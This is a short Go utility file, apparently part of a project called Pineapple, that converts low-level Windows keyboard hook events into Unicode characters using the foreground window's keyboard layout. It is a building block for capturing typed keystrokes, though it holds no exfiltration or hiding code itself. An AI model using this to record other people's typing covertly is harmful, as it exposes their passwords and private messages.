package utils

import (
	"github.com/MShoaei/Pineapple/windows"
)

var PwszBuff = make([]rune, 1)
var KState = make([]byte, 256)

func ToUnicode(key *windows.KBDLLHOOKSTRUCT) string {
	var (
		hkl         windows.HKL
		dwThreadId  windows.DWORD
		dwProcessId windows.DWORD
	)
	hWindowHandle := windows.GetForegroundWindow()
	dwThreadId = windows.DWORD(windows.GetWindowThreadProcessID(hWindowHandle, &dwProcessId))
	windows.GetKeyboardState(&KState)
	hkl = windows.GetKeyboardLayout(dwThreadId)
	// vKey := windows.MapVirtualKeyExW(windows.UINT(key.VkCode), 2, hkl)
	vKey := windows.UINT(key.ScanCode)
	windows.ToUnicodeEx(windows.UINT(key.VkCode), vKey, &KState, &PwszBuff, 4, 0, hkl)
	// fmt.Println(string(PwszBuff))
	return string(PwszBuff)
}
